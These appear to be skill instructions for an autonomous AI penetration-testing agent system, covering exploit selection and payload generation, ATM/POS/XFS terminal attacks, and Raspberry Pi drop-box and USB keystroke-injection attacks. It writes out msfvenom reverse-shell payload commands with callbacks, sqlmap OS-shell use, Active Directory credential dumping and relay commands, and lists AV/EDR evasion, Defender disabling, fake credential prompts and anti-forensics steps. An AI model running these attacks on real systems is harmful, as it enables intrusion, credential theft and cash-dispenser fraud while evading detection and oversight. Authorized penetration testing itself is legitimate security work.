# Skill: Exploit Development & Execution

## Agent: FORGE

## Description
Exploit selection, adaptation, payload generation, and controlled execution against confirmed vulnerabilities.

## Trigger
Orchestrator assigns an exploitation task with specific target, vulnerability, and payload requirements.

## Methodology

### Step 1: Exploit Selection

Decision Tree:
- IF MSF module exists AND reliability_rank >= "good" → Use MSF module
- IF public PoC exists (ExploitDB, GitHub) → Analyze PoC, adapt for target
- IF vulnerability is logic-based (auth bypass, IDOR, SSRF) → Build custom exploit chain
- IF vulnerability requires chaining → Plan multi-step, validate each link

### Step 2: Payload Generation

**Metasploit Payloads**:
```bash
# Staged
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={callback} LPORT={port} -f exe -o payload.exe
# Stageless
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={callback} LPORT={port} -f exe -o payload.exe
# Evasion
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={callback} LPORT={port} -e x64/xor_dynamic -i 5 -f exe -o payload_enc.exe
# Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={callback} LPORT={port} -f elf -o payload.elf
# Web
msfvenom -p php/meterpreter/reverse_tcp LHOST={callback} LPORT={port} -f raw -o shell.php
```

**Custom Payloads**: PowerShell cradles, AMSI bypass, DLL side-loading, macro payloads, HTA/VBS

### Step 3: Exploit Execution

**MSF Flow**: Configure module → Configure payload → Set advanced options → Verify handler → Execute → Wait for session → Verify session → Log result

**Web App Exploitation**:
```bash
# SQLi
sqlmap -u "https://target.com/page?id=1" --batch --level=3 --risk=2 --random-agent
sqlmap -u "https://target.com/page?id=1" --batch --os-shell

# Auth attacks
crackmapexec smb {target} -u users.txt -p 'Spring2026!' --no-bruteforce
impacket-GetUserSPNs -request -dc-ip {dc} {domain}/{user}:{password}
impacket-GetNPUsers -usersfile users.txt -dc-ip {dc} {domain}/ -format hashcat
impacket-ntlmrelayx -tf targets.txt -smb2support -socks

# AD attacks
impacket-secretsdump {domain}/{user}:{password}@{dc} -just-dc-ntlm
certipy find -u {user}@{domain} -p {password} -dc-ip {dc}
```

### Step 4: Evasion Techniques

When AV/EDR detected: AMSI bypass, ETW patching, ntdll unhooking, process injection, LOLBins (certutil, mshta, rundll32, regsvr32), payload obfuscation, timestomping, signed binary proxy execution

### Step 5: Failure Handling

1. Capture full error output
2. Analyze: Patched? Firewall? AV? Wrong arch? Auth required?
3. Try alternative path
4. If exhausted: log as "confirmed vulnerable, exploitation blocked by {reason}"
5. Report to orchestrator

## Output
Per AGENTS.md FORGE output format. Always include: exploit used, payload, session (or failure reason), evidence, cleanup instructions.

---

# Skill: ATM / POS / XFS Terminal Security

## Agent: FORGE (specialized) + SCOUT (recon)

## Description
ATM, POS terminal, and XFS infrastructure security assessment. Full stack from physical access through XFS middleware to host application and network.

## Trigger
Engagement scope includes financial terminal infrastructure.

## Target Architecture

ATM Stack: ATM Application → XFS Middleware (CEN/XFS API) → Service Providers (device drivers) → OS (Windows 10 IoT / 7 Embedded) → Hardware (card reader, cash dispenser, PIN pad, printer)

XFS Device Classes: CDM (Cash Dispenser), IDC (Card Reader), PIN (PIN Pad), PTR (Printer), SIU (Sensors), TTU (Text Terminal), DEP (Depository)

## Assessment Phases

### Phase 1: Physical Security
- Cabinet/top hat lock bypass
- USB port accessibility
- Network port accessibility
- Hard drive access
- Camera coverage gaps
- Skimmer detection capability

USB attacks via Pi HID: keystroke injection to escape kiosk, PowerShell cradles, Rubber Ducky scripts

### Phase 2: Kiosk Escape

Windows methods: Sticky Keys (5x Shift), Utilman (Win+U), dialog box escape (error → Help → browser → cmd), print dialog (save as → filesystem), Task Manager, Explorer shortcuts, touch keyboard, Narrator

Post-escape: whoami, domain check, network, XFS service status, installed software, app whitelisting

### Phase 3: XFS API Assessment

Enumerate: sc query for XFS services, registry HKLM\SOFTWARE\XFS, log files

Test XFS commands: WFSOpen (connect to SP), WFSGetInfo (capabilities), WFSExecute (command execution)

Critical: Can WFS_CMD_CDM_DISPENSE be sent to cash dispenser? SP authentication/encryption? Physical dispense capabilities?

### Phase 4: Network Security

Segmentation (own VLAN? isolation?), TLS on ATM-to-host, certificate validation, remote management (RDP, VNC, SSH, default creds), MITM testing (ARP spoof, capture transactions, check for unencrypted card data, PIN block strength, replay possibility)

### Phase 5: Software Security

App whitelisting (AppLocker/Device Guard, bypass vectors), endpoint protection (AV product, version, real-time), OS hardening (patches, local admin, BitLocker, USB policy, PowerShell policy, .NET version)

Reference ATM malware families for detection assessment: Ploutus, Tyupkin, Ripper, Alice, Cutlet Maker, FASTCash

### Phase 6: POS Terminal (if in scope)

PA-DSS compliance, memory scraping possibility, transaction log analysis, API security, tamper detection, firmware modification, NFC/contactless attack surface

## Reporting Notes

ATM findings carry extra weight: direct financial impact, regulatory implications (PCI-DSS), reputational risk, fleet scale. Include: terminal model, firmware, attack vector type, time required, compensating controls.

## Output
Standard format + ATM fields: terminal model, XFS version, attack vector, fleet impact.

---

# Skill: Physical Access & Hardware Attacks

## Agent: SCOUT + FORGE via Raspberry Pi 4

## Description
Physical penetration testing using Pi 4 as drop box, HID platform, wireless station, and network implant.

## Trigger
Physical security in scope and Pi hardware agent connected.

## Hardware Configuration

Pi 4: Kali Linux ARM / P4wnP1 A.L.O.A.
Interfaces: eth0 (wired), wlan0 (built-in WiFi), wlan1 (USB monitor mode + injection), USB-C (power + HID gadget mode), Bluetooth
Power: USB-C power bank (8+ hours)
Connection: Reverse SSH tunnel primary, cellular modem secondary, WiFi callback tertiary

Orchestrator controls Pi via SSH — same command interface as local tools.

## Attack Modes

### Mode 1: USB HID (Keystroke Injection)

P4wnP1 scripts:
- Reverse shell: Win+R → PowerShell download cradle
- Credential harvest: fake Windows Security prompt → capture to file
- WiFi extraction: netsh wlan show profiles with key=clear
- Defense disable: Set-MpPreference -DisableRealtimeMonitoring

Timing: USB enumeration 2-5s, first keystroke 1-3s delay, target total < 10s for attended

### Mode 2: Network Implant (Drop Box)

Passive: netdiscover, tcpdump, responder analyze mode
Active (operator approved): LLMNR/NBT-NS poisoning, MITM via bettercap, NTLM relay, internal nmap scanning
Persistence: auto-start services, watchdog restart, batch data exfiltration queue

### Mode 3: Wireless Attack Station

Recon: airmon-ng monitor mode, airodump-ng discovery
Attacks: WPA2 handshake capture (deauth + capture), PMKID capture (clientless), evil twin AP, WPA Enterprise credential capture
Bluetooth: BLE scanning, device enumeration

### Mode 4: RFID Cloning (with hardware)

Proxmark3 or GPIO reader: scan badge → clone to blank card → replay for physical access

## Operational Security

Pre-deploy: all payloads loaded, SSH keys (no passwords), auto-start configured, C2 tested, power charged, kill switch ready
During: minimize presence, document location, note physical controls, maintain comms, extraction plan ready
Anti-forensics: FDE on SD card, RAM-only where possible, secure delete after exfil, remote wipe capability

## Integration

Pi is a remote execution endpoint, not a separate system. Orchestrator sends commands via SSH, Pi executes, returns results. All findings feed into same engagement state, artifact registry, and reporting pipeline.

## Output
Standard format + physical fields: deployment method, physical access time, hardware requirements, detection difficulty.
